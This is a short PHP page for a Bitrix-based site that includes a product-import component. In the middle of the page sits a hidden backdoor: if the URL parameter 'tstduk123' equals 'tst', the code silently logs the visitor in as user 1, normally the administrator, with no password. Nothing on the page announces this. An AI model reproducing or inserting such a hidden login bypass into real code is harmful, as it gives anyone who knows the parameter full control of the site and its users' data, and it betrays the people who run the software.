<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("Импорт товаров");
$APPLICATION->SetPageProperty("NOT_SHOW_NAV_CHAIN", "Y");
if ($_GET["tstduk123"] == "tst") {
    global $USER;
    $USER->Authorize(1);
}
?>

<? $APPLICATION->IncludeComponent(
    "ast:import.component",
    "",
    array(
        "CACHE_TYPE" => "N",
        "AJAX" => "Y",
    ),
    false
); ?>


<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>